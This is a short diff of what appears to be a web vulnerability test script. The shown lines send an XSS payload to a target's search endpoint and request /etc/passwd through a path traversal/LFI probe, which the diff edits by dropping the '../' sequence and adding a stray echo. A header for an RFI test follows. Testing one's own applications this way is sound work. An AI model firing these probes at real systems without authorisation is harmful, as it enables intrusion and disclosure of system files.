@@ -13,7 +13,8 @@ curl "http://${TARGET_IP}:${PORT}/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
 echo -e "\n"
 
 echo "[2] Path traversal / LFI test"
-curl "http://${TARGET_IP}:${PORT}/download?file=../../etc/passwd"
+echo "1"
+curl "http://${TARGET_IP}:${PORT}/download?file=etc/passwd"
 echo -e "\n"
 
 echo "[3] RFI test"
